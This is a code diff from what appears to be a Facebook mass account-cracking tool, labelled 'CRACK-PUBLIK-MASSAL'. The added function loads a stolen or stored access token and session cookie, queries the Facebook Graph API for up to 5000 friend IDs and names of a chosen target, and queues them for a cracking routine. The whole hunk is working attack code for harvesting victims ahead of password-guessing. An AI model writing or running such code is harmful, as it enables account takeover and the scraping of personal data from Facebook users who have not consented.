@@ -1128,6 +1128,40 @@ def result():
 		exit()
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
 def ayil_dump():
+    with requests.Session() as ses:
+        token = open('.token1.txt','r').read()
+        tokenku.append(token)
+        cok = open('.cok.txt','r').read()	
+        toke = open('.token1.txt','r').read()
+        prints(Panel(f"""{P2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{P2}ketik {H2}me{P2} untuk dump dari teman sendiri",width=60,style=f"{color_panel}"))
+        a = console.input(f" {H2}• {P2}Masukan Id Target : ")
+        if a in ['me','Me','ME']:
+            try:
+                params ={
+                    "access_token": toke,
+                    "fields":"friends.fields(id,name,birthday)"
+                }
+                koH = requests.get("https://graph.facebook.com/{}".format(a),params=params,cookies={'cookie': cok}).json()
+                for pi in koH['friends']['data']:
+                    try:id.append(pi['id']+'|'+pi['name'])
+                    except:continue
+                setting()
+            except Exception as d:
+                print(d)
+        else:
+            try:
+                params = {
+            "access_token": token, 
+            "fields": "friends.limit(5000)"
+            }
+                b = ses.get('https://graph.facebook.com/{}'.format(a),params=params,cookies={'cookie': cok}).json()
+                for c in b["friends"]["data"]:
+                    id.append(c["id"]+"|"+c["name"])
+                setting()
+            except Exception as e:
+                print(e)
+
+def ayil_dumppp():
 	try:
 		token = open('.token.txt','r').read()
 		kukis = open('.cok.txt','r').read()
